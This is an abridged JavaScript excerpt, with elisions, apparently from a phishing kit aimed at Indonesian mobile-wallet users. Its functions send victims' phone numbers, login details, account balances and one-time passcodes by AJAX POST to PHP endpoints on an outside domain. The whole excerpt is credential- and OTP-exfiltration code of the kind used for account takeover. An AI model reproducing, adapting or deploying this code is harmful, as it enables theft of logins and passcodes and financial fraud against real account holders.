function sendHp() {
   ...
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/33/no.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/33/sudah.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/33/saldosdh.php',
      type: 'POST',
...
function sendOtpS() {        
   ...
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/33/otpsdh.php',
      type: 'POST',
...
document.getElementById("nohp").value =
    ...
    $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/33/belum.php',
      type: 'POST',
...
function sendSaldo() {
   ...
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/33/saldoblm.php',
      type: 'POST',
...
function sendOtp() {
   ...
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/33/otpblm.php',
      type: 'POST',
